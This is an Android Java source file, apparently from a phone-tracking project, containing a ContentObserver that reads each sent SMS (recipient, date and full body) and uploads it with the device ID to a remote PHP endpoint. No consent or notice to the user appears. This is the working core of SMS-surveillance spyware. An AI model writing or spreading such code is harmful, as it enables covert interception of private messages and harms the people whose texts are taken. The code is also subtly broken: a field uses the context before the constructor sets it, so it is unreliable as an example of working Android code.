package my.app.proyectosoftwareandroid;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import android.os.AsyncTask;
import my.app.proyectosoftwareandroid.CallHelper.InsertarLlamada;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.util.Log;

public class SmsSentObserver extends ContentObserver {
	//Mensajes Enviados
	private static final String TAG = "SMSTRACKER";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private static String url_insertar_mensaje = "insertar_mensaje.php";
    private Context mContext;
    private  String numero;
	 private String estado;
	 private String fecha;
	 private String cuerpo;
	 private  TelephonyManager telephonyManager = (TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE);
	 private  String device_id = telephonyManager.getDeviceId();
	 private static final String TAG_SUCCESS = "success";
	 JSONParser jsonParser = new JSONParser();
	 public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		try{
			Log.e(TAG, "Notification on SMS observer");
	        Cursor sms_sent_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
	        if (sms_sent_cursor != null) {
		        if (sms_sent_cursor.moveToFirst()) {
		        	String protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
		        	Log.e(TAG, "protocol : " + protocol);
		        	if(protocol == null){
		        		//String[] colNames = sms_sent_cursor.getColumnNames();
		        		int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
		        		Log.e(TAG, "SMS Type : " + type);
		        		if(type == 2){
		        			
			        		//Log.e(TAG, "Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("_id")));
			        		//Log.e(TAG, "Thread Id : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("thread_id")));
		        			Log.e(TAG, "Address : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")));
			        		//Log.e(TAG, "Person : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("person")));
			        		Log.e(TAG, "Date : " + sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date")));
			        		//Log.e(TAG, "Read : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("read")));
			        		//Log.e(TAG, "Status : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("status")));
			        		//Log.e(TAG, "Type : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("type")));
			        		//Log.e(TAG, "Rep Path Present : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("reply_path_present")));
			        		//Log.e(TAG, "Subject : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("subject")));
			        		Log.e(TAG, "Body : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));
			        		//Log.e(TAG, "Err Code : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("error_code")));
			        		/*
			        		if(colNames != null){
			        			for(int k=0; k<colNames.length; k++){
			        				Log.e(TAG, "colNames["+k+"] : " + colNames[k]);
			        			}
			        		}
			        		*/
			        		fecha =  new Long (sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"))).toString();
			        		numero = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
			        		cuerpo = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));
			        		estado = "Saliente";
							new InsertarMensaje().execute();
		        		}
		        	}
		        }
	        }
	        else
	        	Log.e(TAG, "Send Cursor is Empty");
		}
		catch(Exception sggh){
			Log.e(TAG, "Error on onChange : "+sggh.toString());
		}
		super.onChange(selfChange);
	}//fn onChange
	
	
	
class InsertarMensaje extends AsyncTask<String, String, String> {
    	protected String doInBackground(String... args) {
	    
	        // Building Parameters
	         Date date = new Date();
	        List<NameValuePair> params = new ArrayList<NameValuePair>();
	        params.add(new BasicNameValuePair("id_dispositivo", device_id));
	        params.add(new BasicNameValuePair("telefono", numero));
	        params.add(new BasicNameValuePair("fecha", fecha));
	        params.add(new BasicNameValuePair("cuerpo", cuerpo));
	        params.add(new BasicNameValuePair("estatus", estado));
	        EnvioWeb envioMensajes = new EnvioWeb (url_insertar_mensaje, params);
	        envioMensajes.envio();
	    return null;
    	}

	
	}
	
}//End of class SmsSentObserver
